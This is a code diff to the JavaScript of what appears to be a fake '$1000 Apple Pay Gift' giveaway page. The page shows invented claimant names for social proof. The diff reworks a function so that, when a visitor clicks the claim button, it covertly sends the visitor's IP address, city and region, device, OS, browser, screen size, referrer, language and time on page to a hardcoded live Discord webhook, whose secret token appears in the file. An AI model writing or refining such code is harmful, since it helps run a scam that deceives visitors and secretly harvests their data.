@@ -740,6 +740,9 @@
       // Replace with your Discord webhook URL
       const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1452722421630107698/OlKJNW0c6mECgyUYr3eMTt9qO1tD0BibHK_LYiZi79FiRz8VZqQQmoGcdP429wFSSlUx';
 
+      // Track page load time
+      const pageLoadTime = Date.now();
+
       // Names for notifications
       const NAMES = [
         "Sarah M.", "Michael T.", "Jessica R.", "David W.", "Emma K.",
@@ -762,7 +765,7 @@
       let userGeoData = null;
 
       // ============================================
-      // DISCORD WEBHOOK FUNCTION
+      // DISCORD WEBHOOK FUNCTION (WORKING FORMAT)
       // ============================================
       function sendToDiscordWebhook(eventType, data) {
         if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
@@ -770,123 +773,81 @@
           return;
         }
 
-        // Get current time info
-        const now = new Date();
-        const timeString = now.toLocaleTimeString('en-US', { 
-          hour: '2-digit', 
-          minute: '2-digit', 
-          second: '2-digit',
-          hour12: true 
-        });
-        const dateString = now.toLocaleDateString('en-US', { 
-          weekday: 'long', 
-          year: 'numeric', 
-          month: 'long', 
-          day: 'numeric' 
-        });
+        console.log('🔄 Sending Discord webhook...');
+
+        // Calculate time on page
+        const timeOnPage = Math.floor((Date.now() - pageLoadTime) / 1000);
+        const minutes = Math.floor(timeOnPage / 60);
+        const seconds = timeOnPage % 60;
+        const timeOnPageStr = `${minutes}m ${seconds}s`;
 
         // Device info
         const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
         const deviceType = isMobile ? '📱 Mobile' : '💻 Desktop';
         
         // Browser detection
-        let browser = '🌐 Unknown';
-        if (navigator.userAgent.indexOf('Chrome') > -1) browser = '🔵 Chrome';
-        else if (navigator.userAgent.indexOf('Safari') > -1) browser = '🔵 Safari';
-        else if (navigator.userAgent.indexOf('Firefox') > -1) browser = '🦊 Firefox';
-        else if (navigator.userAgent.indexOf('Edge') > -1) browser = '🔷 Edge';
+        let browser = 'Unknown';
+        if (navigator.userAgent.indexOf('Chrome') > -1) browser = 'Chrome';
+        else if (navigator.userAgent.indexOf('Safari') > -1) browser = 'Safari';
+        else if (navigator.userAgent.indexOf('Firefox') > -1) browser = 'Firefox';
+        else if (navigator.userAgent.indexOf('Edge') > -1) browser = 'Edge';
         
         // OS detection
-        let os = '💿 Unknown';
-        if (navigator.userAgent.indexOf('Win') > -1) os = '🪟 Windows';
-        else if (navigator.userAgent.indexOf('Mac') > -1) os = '🍎 macOS';
-        else if (navigator.userAgent.indexOf('Linux') > -1) os = '🐧 Linux';
-        else if (navigator.userAgent.indexOf('Android') > -1) os = '🤖 Android';
-        else if (navigator.userAgent.indexOf('iOS') > -1) os = '📱 iOS';
+        let os = 'Unknown';
+        if (navigator.userAgent.indexOf('Win') > -1) os = 'Windows';
+        else if (navigator.userAgent.indexOf('Mac') > -1) os = 'macOS';
+        else if (navigator.userAgent.indexOf('Linux') > -1) os = 'Linux';
+        else if (navigator.userAgent.indexOf('Android') > -1) os = 'Android';
+        else if (navigator.userAgent.indexOf('iOS') > -1) os = 'iOS';
 
-        const payload = {
-          username: "Apple Pay Tracker",
-          avatar_url: "https://em-content.zobj.net/thumbs/160/apple/354/gift_1f381.png",
-          embeds: [{
-            title: "🎁 NEW CLAIM BUTTON CLICK!",
-            description: `**Someone just clicked the claim button!**\n━━━━━━━━━━━━━━━━━━━━`,
-            color: 0x00ff00,
-            fields: [
-              {
-                name: "💰 Reward Details",
-                value: `**Amount:** ${data.amount || 'N/A'}\n**Currency:** ${data.currency || 'N/A'}`,
-                inline: true
-              },
-              {
-                name: "⏰ Time & Date",
-                value: `**Time:** ${timeString}\n**Date:** ${dateString}`,
-                inline: true
-              },
-              {
-                name: "\u200b",
-                value: "\u200b",
-                inline: false
-              },
-              {
-                name: "🌍 Location Info",
-                value: `**Country:** ${data.country || 'Unknown'} ${data.countryFlag || ''}\n**Region:** ${data.region || 'Unknown'}\n**City:** ${data.city || 'Unknown'}\n**IP:** \`${data.ip || 'Unknown'}\``,
-                inline: true
-              },
-              {
-                name: "📊 Device Info",
-                value: `**Type:** ${deviceType}\n**OS:** ${os}\n**Browser:** ${browser}\n**Screen:** ${data.screenResolution || 'Unknown'}`,
-                inline: true
-              },
-              {
-                name: "\u200b",
-                value: "\u200b",
-                inline: false
-              },
-              {
-                name: "🔗 Traffic Source",
-                value: `**Referrer:** ${data.referrer || 'Direct Traffic'}\n**Page URL:** ${data.pageUrl || 'Unknown'}`,
-                inline: false
-              },
-              {
-                name: "🖥️ User Agent",
-                value: `\`\`\`${data.userAgent ? data.userAgent.substring(0, 200) : 'Unknown'}\`\`\``,
-                inline: false
-              }
-            ],
-            footer: {
-              text: "🎄 Holiday Apple Pay Tracker | Powered by Discord",
-              icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
-            },
-            timestamp: now.toISOString(),
-            thumbnail: {
-              url: "https://em-content.zobj.net/thumbs/160/apple/354/money-bag_1f4b0.png"
-            }
-          }]
-        };
+        // Build the message content
+        const message = 
+          "🎁 **CLAIM BUTTON CLICKED - $1000 Apple Pay Gift**\n" +
+          "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
+          "⏰ **Time & Date:** " + new Date().toLocaleString() + "\n" +
+          "⏱️ **Time on Page:** " + timeOnPageStr + "\n" +
+          "\n" +
+          "💰 **Reward:** " + data.amount + "\n" +
+          "💵 **Currency:** " + data.currency + "\n" +
+          "\n" +
+          "🌍 **Location Info:**\n" +
+          "   • Country: " + data.country + " " + data.countryFlag + "\n" +
+          "   • Region: " + data.region + "\n" +
+          "   • City: " + data.city + "\n" +
+          "   • IP: `" + data.ip + "`\n" +
+          "   • Timezone: " + data.timezone + "\n" +
+          "\n" +
+          "📱 **Device Info:**\n" +
+          "   • Type: " + deviceType + "\n" +
+          "   • OS: " + os + "\n" +
+          "   • Browser: " + browser + "\n" +
+          "   • Screen: " + data.screenResolution + "\n" +
+          "   • Viewport: " + data.viewportSize + "\n" +
+          "\n" +
+          "🔗 **Traffic Source:**\n" +
+          "   • Referrer: " + data.referrer + "\n" +
+          "   • Page URL: " + data.pageUrl + "\n" +
+          "\n" +
+          "🌐 **Other Info:**\n" +
+          "   • Language: " + data.language + "\n" +
+          "   • Platform: " + data.platform + "\n" +
+          "\n" +
+          "🖥️ **User Agent:**\n```" + data.userAgent.substring(0, 300) + "```";
 
-        // Try multiple methods to send the webhook
-        console.log('🔄 Attempting to send webhook...');
-
-        // Method 1: Standard fetch with no-cors mode
+        // Send using the working format
         fetch(DISCORD_WEBHOOK_URL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(payload),
-          mode: 'no-cors' // This bypasses CORS but you won't get a response
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: message
+          }),
+          keepalive: true
         })
         .then(() => {
-          console.log('✅ Webhook sent (no-cors mode)!');
+          console.log('✅ Discord webhook sent successfully!');
         })
-        .catch(error => {
-          console.error('❌ Method 1 failed:', error);
-          
-          // Method 2: Try using an image beacon as fallback
-          console.log('🔄 Trying alternative method...');
-          const img = new Image();
-          img.src = DISCORD_WEBHOOK_URL + '?wait=true';
-          img.onerror = () => console.log('✅ Webhook likely sent via beacon method');
+        .catch((error) => {
+          console.error('❌ Discord webhook failed:', error);
         });
       }
 
